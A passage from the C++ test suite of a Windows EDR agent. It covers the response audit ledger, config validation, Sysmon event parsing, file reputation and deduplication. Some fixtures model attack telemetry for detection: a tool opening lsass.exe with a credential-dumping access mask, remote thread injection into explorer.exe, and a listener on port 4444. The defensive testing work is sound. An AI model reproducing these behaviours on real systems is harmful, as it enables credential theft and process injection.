        return WriteFile(file, line.data(), static_cast<DWORD>(line.size()),
                         &written, nullptr) && written == line.size() &&
            FlushFileBuffers(file);
    });
    CHECK(ledger.Open(path, error));
    CHECK(!ledger.Attempt(request, error));
    auto state = ledger.State();
    CHECK(!state.available && !state.pending && !state.writable);
    CHECK(!ledger.Contains(request.requestId));
    CHECK(!ledger.Attempt(request, error));
    CHECK(writes == 1);
    ledger.Close();
    CHECK(ReadWholeFile(path).empty());
    fail = false;
    CHECK(ledger.Open(path, error));
    CHECK(ledger.Attempt(request, error));
    CHECK(writes == 2);
    fail = true;
    ResponseActionResult result;
    result.requestId = request.requestId;
    result.status = "terminated";
    CHECK(!ledger.Outcome(result, error));
    state = ledger.State();
    CHECK(!state.available && state.pending && !state.writable);
    CHECK(!ledger.Outcome(result, error));
    CHECK(!ledger.AttemptAction(request, "suspend", error));
    CHECK(writes == 3);
    ledger.Close();
    fail = false;
    CHECK(ledger.Open(path, error));
    CHECK(ledger.State().available && ledger.State().pending);
    CHECK(ledger.Outcome(result, error));
    CHECK(writes == 4 && ledger.State().writable);
    ledger.Close();
    DeleteFileA(path.c_str());

    ResponseAuditLedger partial([](HANDLE file, const std::string& line) {
        DWORD written = 0;
        WriteFile(file, line.data(), static_cast<DWORD>(line.size() / 2),
                  &written, nullptr);
        FlushFileBuffers(file);
        return false;
    });
    CHECK(partial.Open(path, error));
    CHECK(!partial.Attempt(request, error));
    CHECK(!partial.State().writable);
    partial.Close();
    const std::string truncated = ReadWholeFile(path);
    CHECK(!truncated.empty());
    CHECK(!partial.Open(path, error));
    CHECK(!partial.State().available);
    CHECK(ReadWholeFile(path) == truncated);
    DeleteFileA(path.c_str());
}

static void TestResponseLedgerReadinessState() {
    TestResponseLedgerWriteFailureState();
    const std::string path = "edr-native-readiness-" +
        std::to_string(GetCurrentProcessId()) + ".jsonl";
    { std::ofstream clear(path, std::ios::binary); }
    ResponseAuditLedger ledger;
    std::string error;
    auto state = ledger.State();
    CHECK(!state.available && !state.pending && !state.writable);
    CHECK(ledger.Open(path, error));
    state = ledger.State();
    CHECK(state.available && !state.pending && state.writable);
    ResponseActionRequest request;
    request.requestId = "readiness-1234-1234-1234-123456789abc";
    request.timestamp = std::to_string(CurrentFileTime());
    request.pid = 12345;
    request.createTime100ns = 123456789;
    CHECK(ledger.Attempt(request, error));
    state = ledger.State();
    CHECK(state.available && state.pending && !state.writable);
    ledger.Close();
    CHECK(!ledger.State().available);
    CHECK(ledger.Open(path, error));
    state = ledger.State();
    CHECK(state.available && state.pending && !state.writable);
    ResponseActionResult outcome;
    outcome.requestId = "different-1234-1234-1234-123456789abc";
    outcome.status = "terminated";
    CHECK(!ledger.Outcome(outcome, error));
    CHECK(ledger.State().pending);
    outcome.requestId = request.requestId;
    CHECK(ledger.Outcome(outcome, error));
    state = ledger.State();
    CHECK(state.available && !state.pending && state.writable);
    ledger.Close();
    DeleteFileA(path.c_str());
}

static void TestResponseAuditOutcomeCorrelation() {
    const std::string path = "edr-native-audit-correlation-" +
        std::to_string(GetCurrentProcessId()) + ".jsonl";
    const std::string firstId = "aaaaaaaa-1234-1234-1234-123456789abc";
    const std::string secondId = "bbbbbbbb-1234-1234-1234-123456789abc";
    std::string error;
    { std::ofstream clear(path, std::ios::binary); }
    {
        ResponseAuditLedger ledger;
        CHECK(ledger.Open(path, error));
        ResponseActionRequest request;
        request.requestId = firstId;
        request.timestamp = std::to_string(CurrentFileTime());
        request.pid = 12345;
        request.createTime100ns = 123456789;
        CHECK(ledger.Attempt(request, error));
        DeleteFileResult wrongAction;
        wrongAction.requestId = firstId;
        CHECK(!ledger.OutcomeDeleteFile(wrongAction, error));
        CHECK(error == "response audit outcome does not match pending attempt");
        ResponseActionResult result;
        result.requestId = secondId;
        result.status = "terminated";
        CHECK(!ledger.Outcome(result, error));
        CHECK(error == "response audit outcome does not match pending attempt");
        result.requestId = firstId;
        CHECK(ledger.Outcome(result, error));
    }
    std::string contents = ReadWholeFile(path);
    const std::string validContents = contents;
    CHECK(contents.find("\"record_type\":\"outcome\",\"action\":\"terminate\",\"requestId\":\"" +
                        firstId + "\"") != std::string::npos);
    {
        ResponseAuditLedger ledger;
        CHECK(ledger.Open(path, error));
        CHECK(ledger.Contains(firstId));
    }

    const std::string outcomeId = "\"requestId\":\"" + firstId + "\"";
    const size_t outcome = contents.find("\"record_type\":\"outcome\"");
    CHECK(outcome != std::string::npos);
    const size_t id = contents.find(outcomeId, outcome);
    CHECK(id != std::string::npos);
    contents.replace(id, outcomeId.size(), "\"requestId\":\"" + secondId + "\"");
    { std::ofstream tamper(path, std::ios::binary); tamper << contents; }
    {
        ResponseAuditLedger ledger;
        CHECK(!ledger.Open(path, error));
        CHECK(error == "response audit contains malformed ordering or JSONL");
    }

    contents = validContents;
    const std::string action = "\"action\":\"terminate\"";
    const size_t outcomeAction = contents.find(action, outcome);
    CHECK(outcomeAction != std::string::npos);
    contents.replace(outcomeAction, action.size(), "\"action\":\"quarantine\"");
    { std::ofstream tamper(path, std::ios::binary); tamper << contents; }
    {
        ResponseAuditLedger ledger;
        CHECK(!ledger.Open(path, error));
        CHECK(error == "response audit contains malformed ordering or JSONL");
    }

    /* Older flat records had no record_type or chain fields; they remain
     * readable as a legacy prefix and can be followed by chained records. */
    contents = "{\"timestamp\":\"134348719355421281\",\"action\":\"terminate\","
               "\"effective_mode\":\"dry_run\",\"status\":\"accepted\","
               "\"requestId\":\"" + firstId + "\",\"target\":{\"pid\":1,"
               "\"createTime100ns\":\"1\"}}\r\n";
    { std::ofstream legacy(path, std::ios::binary); legacy << contents; }
    {
        ResponseAuditLedger ledger;
        CHECK(ledger.Open(path, error));
        CHECK(ledger.Contains(firstId));
    }
    DeleteFileA(path.c_str());
}

static void TestResponseServerFailsClosedWithoutKey() {
    ResponseServer server;
    std::string error;
    CHECK(!server.Start(R"(\\.\pipe\edr-native-test-never-created)", "",
                        "edr-native-unused-audit.jsonl", false, error));
    CHECK(!error.empty());
}

static void TestResponseServerExecuteStopRace() {
    const std::string suffix = std::to_string(GetCurrentProcessId());
    const std::string keyPath = "edr-native-race-key-" + suffix + ".txt";
    const std::string auditPath = "edr-native-race-audit-" + suffix + ".jsonl";
    {
        std::ofstream key(keyPath, std::ios::binary);
        key << "WlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlo=";
    }
    ResponseServer server;
    std::string error;
    CHECK(server.Start(R"(\\.\pipe\edr-native-stop-race-)" + suffix,
                       keyPath, auditPath, true, error));
    std::atomic<bool> running{true};
    std::thread caller([&] {
        ResponseActionRequest request;
        request.requestId = "race-race-1234-1234-123456789abc";
        request.timestamp = std::to_string(CurrentFileTime());
        request.reason = "stop race";
        request.pid = GetCurrentProcessId(); /* executor rejects protected self */
        request.createTime100ns = 1;
        while (running.load()) {
            ResponseActionResult result;
            server.ExecuteTerminate(request, result);
        }
    });
    server.Stop();
    running.store(false);
    caller.join();
    ResponseActionResult result;
    CHECK(!server.ExecuteTerminate({}, result));
    DeleteFileA(keyPath.c_str());
    DeleteFileA(auditPath.c_str());
}

static void TestConfigEnableSysmon() {
    const char* path = "edr-native-test-config.json";
    HANDLE file = CreateFileA(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_TEMPORARY, nullptr);
    CHECK(file != INVALID_HANDLE_VALUE);
    const char data[] = "{\"enable_sysmon\":true}";
    DWORD written = 0;
    CHECK(WriteFile(file, data, sizeof(data) - 1, &written, nullptr));
    CloseHandle(file);
    Config config;
    std::string error;
    CHECK(LoadConfigFile(path, config, error));
    CHECK(config.enableSysmon);
    DeleteFileA(path);
}

static Event Parse(const wchar_t* xml) {
    Event event;
    CHECK(ParseSysmonXml(xml, event));
    return event;
}

static std::wstring Xml(unsigned int id, const wchar_t* data,
                        const wchar_t* version = L"4") {
    return L"<Event><System><EventID Version='" + std::wstring(version) + L"'>" +
           std::to_wstring(id) +
           L"</EventID><TimeCreated SystemTime='2026-07-30T10:00:00.1234567Z'/>"
           L"</System><EventData><Data Name='RuleName'>rule-a</Data>" + data +
           L"</EventData></Event>";
}

static void TestSysmonProcessCreate() {
    Event event = Parse(
        L"<Event><System><EventID Version='5'>1</EventID>"
        L"<TimeCreated SystemTime='2026-07-30T10:00:00.1234567Z'/></System><EventData>"
        L"<Data Name='ProcessGuid'>{ABC}</Data><Data Name='ProcessId'>42</Data>"
        L"<Data Name='Image'>C:\\Windows\\test.exe</Data>"
        L"<Data Name='CommandLine'>test &amp; run</Data>"
        L"<Data Name='ParentProcessId'>7</Data>"
        L"<Data Name='ParentProcessGuid'>{PARENT}</Data>"
        L"<Data Name='ParentImage'>C:\\Windows\\parent.exe</Data>"
        L"</EventData></Event>");
    CHECK(event.type == EDR_EVT_PROCESS_START);
    CHECK(event.pid == 42 && event.ppid == 7);
    CHECK(event.source == "sysmon");
    CHECK(event.processIdentity == "{ABC}");
    CHECK(event.parentProcessIdentity == "{PARENT}");
    CHECK(event.fields.at(field::kCommandLine) == "test & run");
    CHECK(event.fields.at(field::kSysmonEventId) == "1");
    CHECK(event.fields.at(field::kSysmonVersion) == "5");
    CHECK(event.fields.at(field::kSourceTimestamp) ==
          "2026-07-30T10:00:00.1234567Z");
    CHECK(event.fields.at(field::kTimestampProvenance) == "sysmon_system_time");
    SYSTEMTIME expected = {2026, 7, 0, 30, 10, 0, 0, 0};
    FILETIME expectedFileTime = {};
    CHECK(SystemTimeToFileTime(&expected, &expectedFileTime));
    uint64_t expected100ns = (static_cast<uint64_t>(expectedFileTime.dwHighDateTime) << 32) |
                             expectedFileTime.dwLowDateTime;
    CHECK(event.ts100ns == expected100ns + 1234567);
}

static void TestExpandedSysmonEvents() {
    Event network = Parse(Xml(3,
        L"<Data Name='ProcessGuid'>{NET}</Data><Data Name='ProcessId'>42</Data>"
        L"<Data Name='Image'>C:\\actor.exe</Data><Data Name='Protocol'>udp</Data>"
        L"<Data Name='SourceIp'>fe80::1</Data><Data Name='SourcePort'>53</Data>"
        L"<Data Name='DestinationIp'>2001:db8::10</Data>"
        L"<Data Name='DestinationPort'>65535</Data>").c_str());
    CHECK(network.type == EDR_EVT_NET_CONNECT);
    CHECK(network.fields.at(field::kSrcIp) == "fe80::1");
    CHECK(network.fields.at(field::kDstIp) == "2001:db8::10");
    CHECK(network.fields.at(field::kDstPort) == "65535");
    CHECK(network.fields.at(field::kProtocol) == "udp");

    Event image = Parse(Xml(7,
        L"<Data Name='ProcessGuid'>{LOAD}</Data><Data Name='ProcessId'>50</Data>"
        L"<Data Name='Image'>C:\\actor.exe</Data>"
        L"<Data Name='ImageLoaded'>C:\\target.dll</Data>"
        L"<Data Name='Hashes'>SHA256=abcd</Data>").c_str());
    CHECK(image.type == EDR_EVT_IMAGE_LOAD);
    CHECK(image.fields.at(field::kActorImage) == "C:\\actor.exe");
    CHECK(image.fields.at(field::kTargetImage) == "C:\\target.dll");
    CHECK(image.fields.at(field::kHashes) == "SHA256=abcd");

    Event file = Parse(Xml(11,
        L"<Data Name='ProcessGuid'>{FILE}</Data><Data Name='ProcessId'>51</Data>"
        L"<Data Name='Image'>C:\\writer.exe</Data>"
        L"<Data Name='TargetFilename'>C:\\new.txt</Data>").c_str());
    CHECK(file.type == EDR_EVT_FILE_CREATE);
    CHECK(file.fields.at(field::kFilePath) == "C:\\new.txt");
    CHECK(file.fields.at(field::kTargetPath) == "C:\\new.txt");

    for (unsigned int id : {12u, 13u}) {
        Event reg = Parse(Xml(id,
            L"<Data Name='ProcessGuid'>{REG}</Data><Data Name='ProcessId'>52</Data>"
            L"<Data Name='Image'>C:\\reg.exe</Data>"
            L"<Data Name='EventType'>SetValue</Data>"
            L"<Data Name='TargetObject'>HKLM\\Software\\Value</Data>"
            L"<Data Name='Details'>DWORD (0x1)</Data>").c_str());
        CHECK(reg.type == EDR_EVT_REG_WRITE);
        CHECK(reg.fields.at(field::kRegOperation) == "SetValue");
        CHECK(reg.fields.at(field::kRegKey) == "HKLM\\Software\\Value");
    }

    Event rename = Parse(Xml(14,
        L"<Data Name='ProcessGuid'>{REG2}</Data><Data Name='ProcessId'>53</Data>"
        L"<Data Name='Image'>C:\\reg.exe</Data>"
        L"<Data Name='EventType'>RenameKey</Data>"
        L"<Data Name='TargetObject'>HKLM\\Software\\Old</Data>"
        L"<Data Name='NewName'>HKLM\\Software\\New</Data>").c_str());
    CHECK(rename.fields.at(field::kRegOldTarget) == "HKLM\\Software\\Old");
    CHECK(rename.fields.at(field::kRegNewTarget) == "HKLM\\Software\\New");

    Event dns = Parse(Xml(22,
        L"<Data Name='ProcessGuid'>{DNS}</Data><Data Name='ProcessId'>54</Data>"
        L"<Data Name='Image'>C:\\dns.exe</Data>"
        L"<Data Name='QueryName'>example.test</Data>"
        L"<Data Name='QueryStatus'>0</Data>"
        L"<Data Name='QueryResults'>::ffff:192.0.2.1;2001:db8::1</Data>").c_str());
    CHECK(dns.type == EDR_EVT_DNS_QUERY);
    CHECK(dns.fields.at(field::kTargetHost) == "example.test");
    CHECK(dns.fields.at(field::kQueryResults) ==
          "::ffff:192.0.2.1;2001:db8::1");
    CHECK(dns.fields.at(field::kSysmonRuleName) == "rule-a");
}

static void TestSysmonStrictValidation() {
    Event event;
    CHECK(!ParseSysmonXml(Xml(3,
        L"<Data Name='ProcessId'>42x</Data><Data Name='SourcePort'>1</Data>"
        L"<Data Name='DestinationPort'>2</Data>").c_str(), event));
    CHECK(!ParseSysmonXml(Xml(3,
        L"<Data Name='ProcessId'>42</Data><Data Name='SourcePort'>-1</Data>"
        L"<Data Name='DestinationPort'>2</Data>").c_str(), event));
    CHECK(!ParseSysmonXml(Xml(3,
        L"<Data Name='ProcessId'>42</Data><Data Name='SourcePort'>1</Data>"
        L"<Data Name='DestinationPort'>65536</Data>").c_str(), event));
    CHECK(!ParseSysmonXml(Xml(13,
        L"<Data Name='ProcessId'>42</Data>"
        L"<Data Name='TargetObject'>HKLM\\Value</Data>").c_str(), event));
}

static void TestConfigRangeValidation() {
    const char* path = "edr-native-test-config-range.json";
    {
        std::ofstream out(path, std::ios::binary);
        out << "{\"enable_sysmon_image_load\":true,"
               "\"enable_sysmon_process_access\":true,\"sysmon_queue_capacity\":16,"
               "\"sysmon_workers\":4,\"sysmon_max_xml_bytes\":4096,"
               "\"file_reputation\":{\"enable\":true,"
               "\"max_file_bytes\":1048576,\"cache_only_trust\":true}}";
    }
    Config config;
    std::string error;
    CHECK(LoadConfigFile(path, config, error));
    CHECK(config.enableSysmonImageLoad);
    CHECK(config.enableSysmonProcessAccess);
    CHECK(config.sysmonQueueCapacity == 16 && config.sysmonWorkers == 4);
    CHECK(config.fileReputationEnable);
    CHECK(config.fileReputationMaxBytes == 1048576);
    {
        std::ofstream out(path, std::ios::binary);
        out << "{\"sysmon_workers\":0}";
    }
    Config invalid;
    CHECK(!LoadConfigFile(path, invalid, error));
    {
        std::ofstream out(path, std::ios::binary);
        out << "{\"enable_sysmon\":true,"
               "\"enable_sysmon_process_access\":\"yes\"}";
    }
    Config atomic;
    CHECK(!LoadConfigFile(path, atomic, error));
    CHECK(!atomic.enableSysmon);
    CHECK(!atomic.enableSysmonProcessAccess);
    DeleteFileA(path);
}

static void TestNewCollectorConfig() {
    const char* path = "edr-native-test-new-collector-config.json";
    {
        std::ofstream out(path, std::ios::binary);
        out << "{\"enable_usb_monitor\":true,\"usb_poll_ms\":2000,"
               "\"usb_dedup_window_ms\":30000,"
               "\"enable_listener_monitor\":true,\"listener_poll_ms\":5000,"
               "\"enable_service_monitor\":true,\"service_poll_ms\":30000,"
               "\"enable_critical_process_monitor\":true,"
               "\"critical_process_poll_ms\":4000,"
               "\"critical_process_missing_threshold\":3,"
               "\"critical_process_images\":[\"MsMpEng.exe\",\"edr.exe\"],"
               "\"enable_fim_monitor\":true,\"fim_poll_ms\":90000,"
               "\"fim_max_file_bytes\":1048576,"
               "\"fim_watch_files\":[\"C:\\\\hosts\",\"%SystemRoot%\\\\x\"],"
               "\"enable_share_monitor\":true,\"share_poll_ms\":20000,"
               "\"enable_local_account_monitor\":true,"
               "\"local_account_poll_ms\":45000,"
               "\"local_account_watch_groups\":[\"Administrators\"],"
               "\"enable_firewall_monitor\":true,\"firewall_poll_ms\":15000,"
               "\"enable_rdp_log\":true,\"rdp_queue_capacity\":256,"
               "\"rdp_workers\":1,\"rdp_max_xml_bytes\":8192}";
    }
    Config config;
    std::string error;
    CHECK(LoadConfigFile(path, config, error));
    CHECK(config.enableUsbMonitor);
    CHECK(config.usbPollMs == 2000);
    CHECK(config.usbDedupWindowMs == 30000);
    CHECK(config.enableListenerMonitor);
    CHECK(config.listenerPollMs == 5000);
    CHECK(config.enableServiceMonitor);
    CHECK(config.servicePollMs == 30000);
    CHECK(config.enableCriticalProcessMonitor);
    CHECK(config.criticalProcessPollMs == 4000);
    CHECK(config.criticalProcessMissingThreshold == 3);
    CHECK(config.criticalProcessImages.size() == 2);
    CHECK(config.criticalProcessImages[0] == "MsMpEng.exe");
    CHECK(config.criticalProcessImages[1] == "edr.exe");
    CHECK(config.enableFimMonitor);
    CHECK(config.fimPollMs == 90000);
    CHECK(config.fimMaxFileBytes == 1048576);
    CHECK(config.fimWatchFiles.size() == 2);
    CHECK(config.fimWatchFiles[0] == "C:\\hosts");
    CHECK(!config.fimWatchFiles[1].empty());
    CHECK(config.enableShareMonitor);
    CHECK(config.sharePollMs == 20000);
    CHECK(config.enableLocalAccountMonitor);
    CHECK(config.localAccountPollMs == 45000);
    CHECK(config.localAccountWatchGroups.size() == 1);
    CHECK(config.localAccountWatchGroups[0] == "Administrators");
    CHECK(config.enableFirewallMonitor);
    CHECK(config.firewallPollMs == 15000);
    CHECK(config.enableRdpLog);
    CHECK(config.rdpLogQueueCapacity == 256);
    CHECK(config.rdpLogWorkers == 1);
    CHECK(config.rdpLogMaxXmlBytes == 8192);
    /* Unknown keys are rejected. */
    {
        std::ofstream out(path, std::ios::binary);
        out << "{\"enable_usb_monitor\":\"yes\"}";
    }
    Config invalid;
    CHECK(!LoadConfigFile(path, invalid, error));
    DeleteFileA(path);
}

static void TestSysmonProcessAccess() {
    Event access = Parse(Xml(10,
        L"<Data Name='SourceProcessGUID'>{SOURCE}</Data>"
        L"<Data Name='SourceProcessId'>120</Data>"
        L"<Data Name='SourceImage'>C:\\Tools\\injector.exe</Data>"
        L"<Data Name='TargetProcessGUID'>{TARGET}</Data>"
        L"<Data Name='TargetProcessId'>500</Data>"
        L"<Data Name='TargetImage'>C:\\Windows\\System32\\lsass.exe</Data>"
        L"<Data Name='GrantedAccess'>0X0000043A</Data>"
        L"<Data Name='CallTrace'>C:\\a.dll+1 &amp; C:\\b.dll+2</Data>").c_str());
    CHECK(access.type == EDR_EVT_PROCESS_ACCESS);
    CHECK(access.pid == 120);
    CHECK(access.processIdentity == "{source}");
    CHECK(access.fields.at(field::kTargetProcessGuid) == "{target}");
    CHECK(access.fields.at(field::kTargetPid) == "500");
    CHECK(access.fields.at(field::kGrantedAccess) == "0x0000043a");
    CHECK(access.fields.at(field::kCrossProcess) == "true");
    CHECK(access.fields.at(field::kAccessCreateThread) == "true");
    CHECK(access.fields.at(field::kAccessVmOperation) == "true");
    CHECK(access.fields.at(field::kAccessVmRead) == "true");
    CHECK(access.fields.at(field::kAccessVmWrite) == "true");
    CHECK(access.fields.at(field::kAccessQueryInformation) == "true");
    CHECK(access.fields.at(field::kAccessDuplicateHandle) == "false");
    CHECK(access.fields.at(field::kCallTrace) ==
          "C:\\a.dll+1 & C:\\b.dll+2");

    Event invalid;
    CHECK(!ParseSysmonXml(Xml(10,
        L"<Data Name='SourceProcessGUID'>{S}</Data>"
        L"<Data Name='SourceProcessId'>1</Data>"
        L"<Data Name='SourceImage'>C:\\s.exe</Data>"
        L"<Data Name='TargetProcessGUID'>{T}</Data>"
        L"<Data Name='TargetProcessId'>2</Data>"
        L"<Data Name='TargetImage'>C:\\t.exe</Data>"
        L"<Data Name='GrantedAccess'>43a</Data>").c_str(), invalid));
    CHECK(!ParseSysmonXml(Xml(10,
        L"<Data Name='SourceProcessId'>1</Data>"
        L"<Data Name='SourceImage'>C:\\s.exe</Data>"
        L"<Data Name='TargetProcessGUID'>{T}</Data>"
        L"<Data Name='TargetProcessId'>2</Data>"
        L"<Data Name='TargetImage'>C:\\t.exe</Data>"
        L"<Data Name='GrantedAccess'>0x10</Data>").c_str(), invalid));
}

static void TestSysmonThreadCreate() {
    Event remote = Parse(Xml(8,
        L"<Data Name='SourceProcessGUID'>{INJECTOR}</Data>"
        L"<Data Name='SourceProcessId'>120</Data>"
        L"<Data Name='SourceImage'>C:\\Tools\\injector.exe</Data>"
        L"<Data Name='TargetProcessGUID'>{VICTIM}</Data>"
        L"<Data Name='TargetProcessId'>500</Data>"
        L"<Data Name='TargetImage'>C:\\Windows\\explorer.exe</Data>"
        L"<Data Name='NewThreadId'>9001</Data>"
        L"<Data Name='StartAddress'>0x7ff6a1b2c3d4</Data>"
        L"<Data Name='StartModule'>C:\\Windows\\System32\\kernel32.dll</Data>"
        L"<Data Name='StartFunction'>CreateRemoteThreadStub</Data>").c_str());
    CHECK(remote.type == EDR_EVT_THREAD_CREATE);
    CHECK(remote.pid == 120);
    CHECK(remote.processIdentity == "{injector}");
    CHECK(remote.fields.at(field::kType) == "THREAD_CREATE");
    CHECK(remote.fields.at(field::kSourcePid) == "120");
    CHECK(remote.fields.at(field::kTargetPid) == "500");
    CHECK(remote.fields.at(field::kThreadId) == "9001");
    CHECK(remote.fields.at(field::kImage) == "C:\\Tools\\injector.exe");
    CHECK(remote.fields.at(field::kActorImage) == "C:\\Tools\\injector.exe");
    CHECK(remote.fields.at(field::kTargetImage) ==
          "C:\\Windows\\explorer.exe");
    CHECK(remote.fields.at(field::kSourceProcessGuid) == "{injector}");
    CHECK(remote.fields.at(field::kTargetProcessGuid) == "{victim}");
    CHECK(remote.fields.at(field::kStartAddress) == "0x7ff6a1b2c3d4");
    CHECK(remote.fields.at(field::kStartModule) ==
          "C:\\Windows\\System32\\kernel32.dll");
    CHECK(remote.fields.at(field::kStartFunction) ==
          "CreateRemoteThreadStub");
    CHECK(remote.fields.at(field::kRemoteThread) == "true");
    CHECK(remote.fields.at(field::kSysmonEventId) == "8");

    Event local = Parse(Xml(8,
        L"<Data Name='SourceProcessGUID'>{SELF}</Data>"
        L"<Data Name='SourceProcessId'>120</Data>"
        L"<Data Name='SourceImage'>C:\\app.exe</Data>"
        L"<Data Name='TargetProcessGUID'>{SELF}</Data>"
        L"<Data Name='TargetProcessId'>120</Data>"
        L"<Data Name='TargetImage'>C:\\app.exe</Data>"
        L"<Data Name='NewThreadId'>7</Data>").c_str());
    CHECK(local.type == EDR_EVT_THREAD_CREATE);
    CHECK(local.fields.at(field::kRemoteThread) == "false");
    CHECK(local.fields.at(field::kStartModule).empty());
    CHECK(local.fields.at(field::kStartFunction).empty());

    Event invalid;
    CHECK(!ParseSysmonXml(Xml(8,
        L"<Data Name='SourceProcessId'>120</Data>"
        L"<Data Name='SourceImage'>C:\\s.exe</Data>"
        L"<Data Name='TargetProcessGUID'>{T}</Data>"
        L"<Data Name='TargetProcessId'>500</Data>"
        L"<Data Name='TargetImage'>C:\\t.exe</Data>"
        L"<Data Name='NewThreadId'>1</Data>").c_str(), invalid));
    CHECK(!ParseSysmonXml(Xml(8,
        L"<Data Name='SourceProcessGUID'>{S}</Data>"
        L"<Data Name='SourceProcessId'>120</Data>"
        L"<Data Name='SourceImage'>C:\\s.exe</Data>"
        L"<Data Name='TargetProcessGUID'>{T}</Data>"
        L"<Data Name='TargetProcessId'>500</Data>"
        L"<Data Name='TargetImage'>C:\\t.exe</Data>"
        L"<Data Name='NewThreadId'>0</Data>").c_str(), invalid));
}

static void TestFileReputation() {
    const wchar_t* path = L"edr-native-reputation-test.bin";
    HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_TEMPORARY, nullptr);
    CHECK(file != INVALID_HANDLE_VALUE);
    const char content[] = "abc";
    DWORD written = 0;
    CHECK(WriteFile(file, content, 3, &written, nullptr) && written == 3);
    CloseHandle(file);

    FileReputationSettings settings;
    settings.enabled = true;
    settings.maxFileBytes = 1024;
    settings.cacheOnlyTrust = true;
    FileReputationResult result = GetFileReputation(std::wstring(path), settings);
    CHECK(result.status == FileReputationStatus::Complete);
    CHECK(result.sha256 ==
          "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
    CHECK(result.authenticode != AuthenticodeStatus::Trusted);
    CHECK(result.authenticode != AuthenticodeStatus::NotChecked);
    CHECK(result.authenticodeStatusCode != 0);
    CHECK(!result.catalogSignaturesSupported);

    settings.maxFileBytes = 2;
    result = GetFileReputation(std::wstring(path), settings);
    CHECK(result.status == FileReputationStatus::FileTooLarge);
    CHECK(result.sha256.empty());

    settings.enabled = false;
    result = GetFileReputation(std::wstring(path), settings);
    CHECK(result.status == FileReputationStatus::Disabled);
    DeleteFileW(path);
}

static void TestSysmonProcessStop() {
    Event event = Parse(
        L"<Event><System><EventID>5</EventID><Version>3</Version></System><EventData>"
        L"<Data Name=\"ProcessGuid\">{DEF}</Data>"
        L"<Data Name=\"ProcessId\">99</Data>"
        L"<Data Name=\"Image\">C:\\stop.exe</Data>"
        L"</EventData></Event>");
    CHECK(event.type == EDR_EVT_PROCESS_STOP);
    CHECK(event.pid == 99);
    CHECK(event.fields.at(field::kImage) == "C:\\stop.exe");
    CHECK(event.fields.at(field::kSysmonVersion) == "3");
    CHECK(event.fields.at(field::kTimestampProvenance) == "collector_time_fallback");
}

static void TestSemanticDedup() {
    SemanticDeduplicator dedup;
    Event first;
    first.type = EDR_EVT_PROCESS_START;
    first.ts100ns = 10000000;
    first.pid = 55;
    first.processIdentity = "guid-one";
    first.fields[field::kImage] = "same.exe";
    first.fields[field::kPpid] = "1";
    CHECK(!dedup.IsDuplicate(first));

    Event duplicate = first;
    duplicate.ts100ns += 1000;
    CHECK(dedup.IsDuplicate(duplicate));
    Event otherProvider = duplicate;
    otherProvider.source = "another-source";
    CHECK(!dedup.IsDuplicate(otherProvider));

    Event reusedPid = duplicate;
    reusedPid.processIdentity = "guid-two";
    CHECK(!dedup.IsDuplicate(reusedPid));

    Event pidOnly = duplicate;
    pidOnly.processIdentity.clear();
    pidOnly.processStartTime100ns = 0;
    CHECK(!dedup.IsDuplicate(pidOnly));

    Event firstDns;
    firstDns.type = EDR_EVT_DNS_QUERY;
    firstDns.ts100ns = 20000000;
    firstDns.processIdentity = "dns-guid";
    firstDns.fields[field::kTargetHost] = "example.test";
    CHECK(!dedup.IsDuplicate(firstDns));
    Event duplicateDns = firstDns;
    duplicateDns.fields[field::kQueryResults] = "192.0.2.1";
    CHECK(dedup.IsDuplicate(duplicateDns));

    Event firstThread;
    firstThread.type = EDR_EVT_THREAD_CREATE;
    firstThread.ts100ns = 30000000;
    firstThread.processIdentity = "thread-guid";
    firstThread.fields[field::kTargetPid] = "400";
    firstThread.fields[field::kStartAddress] = "0x1000";
    CHECK(!dedup.IsDuplicate(firstThread));
    Event duplicateThread = firstThread;
    duplicateThread.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateThread));
    Event distinctThread = duplicateThread;
    distinctThread.fields[field::kStartAddress] = "0x2000";
    CHECK(!dedup.IsDuplicate(distinctThread));
    Event distinctTarget = duplicateThread;
    distinctTarget.fields[field::kTargetPid] = "401";
    CHECK(!dedup.IsDuplicate(distinctTarget));

    CHECK(std::string(EventTypeName(18)) == "PROCESS_READ");
    CHECK(std::string(EventTypeName(19)) == "FILE_READ");
    CHECK(std::string(EventTypeName(20)) == "APC_INJECT");
    CHECK(std::string(EventTypeName(21)) == "CONTEXT_CHANGE");
    CHECK(std::string(EventTypeName(22)) == "MEMORY_WRITE");
    CHECK(std::string(EventTypeName(23)) == "FILE_DELETE");
    CHECK(std::string(EventTypeName(24)) == "USB_DEVICE");
    CHECK(std::string(EventTypeName(25)) == "NET_LISTENER");
    CHECK(std::string(EventTypeName(26)) == "SERVICE_CHANGE");
    CHECK(std::string(EventTypeName(27)) == "CRITICAL_PROCESS");
    CHECK(std::string(EventTypeName(28)) == "FILE_INTEGRITY");
    CHECK(std::string(EventTypeName(29)) == "SHARE_CHANGE");
    CHECK(std::string(EventTypeName(52)) == "LOCAL_ACCOUNT");
    CHECK(std::string(EventTypeName(53)) == "FIREWALL_RULE");

    /* USB_DEVICE: dedup on drive letter + serial + name + action. */
    Event firstUsb;
    firstUsb.type = EDR_EVT_USB_DEVICE;
    firstUsb.ts100ns = 40000000;
    firstUsb.processIdentity = "usb-guid";
    firstUsb.fields[field::kUsbDriveLetter] = "E:";
    firstUsb.fields[field::kUsbSerial] = "ABCD1234";
    firstUsb.fields[field::kUsbDeviceName] = "Vendor Drive";
    firstUsb.fields[field::kUsbAction] = "added";
    CHECK(!dedup.IsDuplicate(firstUsb));
    Event duplicateUsb = firstUsb;
    duplicateUsb.ts100ns += 500;
    CHECK(dedup.IsDuplicate(duplicateUsb));
    Event distinctUsbAction = firstUsb;
    distinctUsbAction.fields[field::kUsbAction] = "removed";
    CHECK(!dedup.IsDuplicate(distinctUsbAction));
    Event distinctUsbDrive = firstUsb;
    distinctUsbDrive.fields[field::kUsbDriveLetter] = "F:";
    CHECK(!dedup.IsDuplicate(distinctUsbDrive));

    /* NET_LISTENER: dedup on ip + port + protocol + pid + action. */
    Event firstListener;
    firstListener.type = EDR_EVT_NET_LISTENER;
    firstListener.ts100ns = 50000000;
    firstListener.processIdentity = "listener-guid";
    firstListener.fields[field::kListenerIp] = "*";
    firstListener.fields[field::kListenerPort] = "4444";
